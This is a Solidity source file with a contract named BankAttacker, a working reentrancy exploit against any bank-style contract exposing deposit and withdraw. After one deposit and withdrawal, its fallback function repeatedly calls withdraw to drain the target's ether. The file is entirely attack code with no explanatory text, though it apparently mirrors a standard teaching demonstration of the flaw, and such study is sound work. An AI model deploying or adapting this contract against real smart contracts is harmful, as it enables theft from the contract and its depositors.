// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract BankAttacker {
    address bank;

    constructor (address _bank) payable {
        bank = _bank;
    }

    function attackIt() public payable {
        require(bank.balance > 1 ether);
        require(msg.value >= 1 ether);
        IBank(bank).deposit{value : 1 ether}();
        IBank(bank).withdraw(1 ether);
    }

    fallback() external payable {
        if (bank.balance > 1.1 ether) {
            IBank(bank).withdraw(1 ether);
        }
    }
}
